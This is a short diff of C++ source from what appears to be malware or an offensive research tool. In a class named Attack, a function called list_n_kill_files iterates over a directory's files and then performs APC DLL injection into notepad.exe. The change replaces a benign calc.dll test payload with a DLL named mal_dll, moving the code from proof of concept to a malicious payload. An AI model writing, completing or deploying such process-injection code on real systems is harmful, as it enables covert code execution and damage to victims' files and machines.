@@ -104,7 +104,7 @@ vector<wstring> Attack::list_n_kill_files(wstring path)
 		} while (FindNextFile(hFind, &ffd) != 0);
 		// now attack the file editor! notebook
 		std::cout << "\nInjecting all writing processes" << std::endl;
-		APCinjection("notepad.exe", (TCHAR *)"..\\..\\dll\\calc.dll");
+		APCinjection("notepad.exe", (TCHAR *)"..\\..\\dll\\mal_dll\\Release\\mal_dll.dll");
 	}
 	else {
 		std::cout << "Can't find files in directory" << std::endl;
